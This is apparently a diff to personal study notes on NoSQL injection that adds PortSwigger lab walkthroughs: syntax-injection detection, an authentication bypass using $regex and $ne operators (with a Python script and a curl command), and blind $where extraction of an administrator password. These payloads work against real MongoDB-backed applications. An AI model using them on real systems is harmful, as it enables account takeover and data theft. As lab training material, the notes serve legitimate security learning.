@@ -1,5 +1,7 @@
 # NoSQL Injection
 
+Most of these notes were taken from online sources and/or courses. I'm not that smart to come up with all this on my own. The primary source was PortSwigger. Check out their [NoSQL Injection learning path](https://portswigger.net/web-security/learning-paths/nosql-injection) on the Web Security Academy. 
+
 There are two different types of NoSQL injection:
 
 - Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
@@ -96,6 +98,123 @@ Try injecting a null character after the query
 https://insecure-website.com/product/lookup?category=fizzy'%00
 ```
 
+???+ example "PortSwigger NoSQL Injection Lab 1: Detecting NoSQL injection"
+
+	### Lab 1: Detecting NoSQL injection
+	
+	```
+	GET /filter?category=Pets'%22%60%7B%20%3B%24Foo%7D%20%24Foo%20%5CxYZ HTTP/1.1
+	Host: 0a8c001604495d9180c60dd0006c004a.web-security-academy.net
+	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate, br, zstd
+	Connection: keep-alive
+	Referer: https://0a8c001604495d9180c60dd0006c004a.web-security-academy.net/
+	Cookie: session=d82ldTNqdPOXGQFfW3TXmFcwNInibcG3
+	Upgrade-Insecure-Requests: 1
+	Sec-Fetch-Dest: document
+	Sec-Fetch-Mode: navigate
+	Sec-Fetch-Site: same-origin
+	Sec-Fetch-User: ?1
+	X-PwnFox-Color: magenta
+	Priority: u=0, i
+	
+	
+	```
+	
+	This causes an internal server error
+	
+	```
+	HTTP/1.1 500 Internal Server Error
+	Content-Type: text/html; charset=utf-8
+	X-Frame-Options: SAMEORIGIN
+	Connection: close
+	Content-Length: 2793
+	
+	<!DOCTYPE html>
+	<html>
+	
+	<head>
+	    <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+	    <link href=/resources/css/labs.css rel=stylesheet>
+	    <title>Detecting NoSQL injection</title>
+	</head>
+	<script src="/resources/labheader/js/labHeader.js"></script>
+	<div id="academyLabHeader">
+	    <section class='academyLabBanner'>
+	        <div class=container>
+	            <div class=logo></div>
+	            <div class=title-container>
+	                <h2>Detecting NoSQL injection</h2>
+	                <a id='lab-link' class='button' href='/'>Back to lab home</a>
+	                <a class=link-back href='https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection'>
+	                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+	                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+	                        <g>
+	                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+	                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+	                        </g>
+	                    </svg>
+	                </a>
+	            </div>
+	            <div class='widgetcontainer-lab-status is-notsolved'>
+	                <span>LAB</span>
+	                <p>Not solved</p>
+	                <span class=lab-status-icon></span>
+	            </div>
+	        </div>
+	</div>
+	</section>
+	</div>
+	<div theme="">
+	    <section class="maincontainer">
+	        <div class="container is-page">
+	            <header class="navigation-header">
+	            </header>
+	            <h4>Internal Server Error</h4>
+	            <p class=is-warning>Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: malformed hexadecimal character escape sequence :
+	                functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
+	                &apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: malformed hexadecimal character escape sequence :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}</p>
+	        </div>
+	    </section>
+	</div>
+	</body>
+	
+	</html>
+	```
+	
+	Note that sending a `'` character results in an error
+	
+	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727085013.png)
+	
+	Sending a valid JS payload fixes the error
+	
+	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727085026.png)
+	
+	Check conditional behavior. Note that when we send a negative conditional, no products are shown
+	
+	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727085044.png)
+	
+	!!! warning
+	    Make sure to URL encode this
+	
+	Now when we send a truthy value, products are returned.
+	
+	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727085117.png)
+	
+	Now sending an "or 1=1" payload we can get all products listed
+	
+	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727085130.png)
+	
+	Final payload
+	
+	```
+	'||1||'
+	```
+	
+
+
 ## Operator Injection
 
 NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include:
@@ -143,6 +262,199 @@ We can check a list of known usernames:
 ```
 {"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
 ```
+
+???+ example "PortSwigger NoSQL Injection Lab 2: Exploiting NoSQL operator injection to bypass authentication"
+
+	### Lab 2: Exploiting NoSQL operator injection to bypass authentication
+	
+	Original request
+	
+	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727084852.png)
+	
+	Checking if the username field processes the operator...looks like it does because even though we didn't enter the correct username, we still are able to get logged in as `wiener`
+	
+	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727084914.png)
+	
+	Checking if the password field also processes it...looks like it also does. Note the response that the query returned an unexpected number of results. 
+	
+	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727084926.png)
+	
+	Using the regex operator we can get logged in as the admin user, which has a random username
+	
+	![](../../../../assets/screenshots/nosql/Pasted%20image%2020250727084944.png)
+	
+	### Sample Code Solution
+	
+	#### Python
+	This code will solve this challenge
+	
+	```python
+	import requests
+	
+	url = 'https://0a6f00c903ee32228074712400a300a8.web-security-academy.net/login'
+	
+	headers = {
+	  'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv',
+	  'Content-Type': 'application/json',
+	  'Cookie': 'session=Oeo2rw4ypJQwM1hYHAsO4yNGTqXwxzJq',
+	  'Priority': 'u=0'
+	}
+	
+	data = {
+	  "username": {
+	    "$regex": "admin*"
+	  },
+	  "password": {
+	    "$ne": "invalid"
+	  }
+	}
+	
+	r = requests.post(url, headers=headers, json=data)
+	
+	print(r.status_code)
+	print(r.text)
+	```
+	
+	#### Curl
+	
+	```bash
+	curl -X POST \
+	    -H 'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv' \
+	    -H 'Content-Type:application/json' \
+	    -H 'Cookie:session=Oeo2rw4ypJQwM1hYHAsO4yNGTqXwxzJq' \
+	    -H 'Priority:u=0' \
+	    -d '{
+	  "username": {
+	    "$regex": "admin*"
+	  },
+	  "password": {
+	    "$ne": "invalid"
+	  }
+	}' \
+	    'https://0a6f00c903ee32228074712400a300a8.web-security-academy.net/login'
+	```
+
+
+
+
+
+## Exfiltrating Data
+
+If the query is using a `$where` clause, we can try to inject into that to retrieve sensitive data
+
+```
+admin' && this.password[0] == 'a' || 'a'=='b
+```
+
+or using the JavaScript `match()` function:
+
+```
+admin' && this.password.match(/\d/) || 'a'=='b
+```
+
+## Identifying Field Names
+
+It can be difficult to identify field names since NoSQL doesn't require a fixed schema (like SQL), but we can usually infer the existence of a field by the responses:
+
+```
+https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
+```
+
+Comparing against a known:
+
+```
+admin' && this.username!='
+```
+
+and an unknown
+
+```
+admin' && this.foo!='
+```
+
+???+ example "PortSwigger NoSQL Injection Lab 3: Exploiting NoSQL injection to extract data"
+	### Lab 3: Exploiting NoSQL injection to extract data
+	[PortSwigger NoSQL Injection Lab #3](https://portswigger.net/web-security/learning-paths/nosql-injection/exploiting-syntax-injection-to-extract-data/nosql-injection/lab-nosql-injection-extract-data)
+	
+	We need to extract the administrator password and log in to solve the lab
+	
+	Confirming that the `password` field exists
+	
+	```
+	GET /user/lookup?user=administrator'+%26%26+this.password!%3d' HTTP/1.1
+	Host: 0aa7008b033ca58c807c083c00f8009e.web-security-academy.net
+	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
+	Accept: */*
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate, br, zstd
+	Referer: https://0aa7008b033ca58c807c083c00f8009e.web-security-academy.net/my-account?id=wiener
+	Connection: keep-alive
+	Cookie: session=QMIuURiqO62GwvlLWRvDsROkHS4k2u5q
+	Sec-Fetch-Dest: empty
+	Sec-Fetch-Mode: cors
+	Sec-Fetch-Site: same-origin
+	X-PwnFox-Color: magenta
+	Priority: u=4
+	
+	
+	```
+	
+	```
+	HTTP/1.1 200 OK
+	Content-Type: application/json; charset=utf-8
+	X-Frame-Options: SAMEORIGIN
+	Connection: close
+	Content-Length: 96
+	
+	{
+	    "username": "administrator",
+	    "email": "admin@normal-user.net",
+	    "role": "administrator"
+	}
+	```
+	
+	First thing, we need to figure out how long the password is. The following request will return the right response if the condition is true, and will return a user not found error if it's false.
+	
+	```
+	GET /user/lookup?user=administrator'%20%26%26%20this.password.length%20%3E%201%20%7C%7C%20'a'%3D%3D'b HTTP/1.1
+	Host: 0aa7008b033ca58c807c083c00f8009e.web-security-academy.net
+	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
+	Accept: */*
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate, br, zstd
+	Referer: https://0aa7008b033ca58c807c083c00f8009e.web-security-academy.net/my-account?id=wiener
+	Connection: keep-alive
+	Cookie: session=QMIuURiqO62GwvlLWRvDsROkHS4k2u5q
+	Sec-Fetch-Dest: empty
+	Sec-Fetch-Mode: cors
+	Sec-Fetch-Site: same-origin
+	X-PwnFox-Color: magenta
+	Priority: u=4
+	
+	```
+	
+	Running this through automate (intruder, whatever) we see that we get the correct response with `this.password.length > 7`, but it fails with `> 8`, so we know the password has 8 characters. 
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727102840.png)
+	
+	Now we can tweak the automate settings a bit
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727105215.png)
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727105229.png)
+	
+	Looking at the results we can see it **seems** to have worked...
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727105339.png)
+	
+	```
+	ppycphbs
+	```
+	
+	That worked to log in as the administrator, and we solved the lab
+	
+	![](../../../assets/screenshots/nosql/Pasted%20image%2020250727105503.png)
+
 
 ## Prevention
 
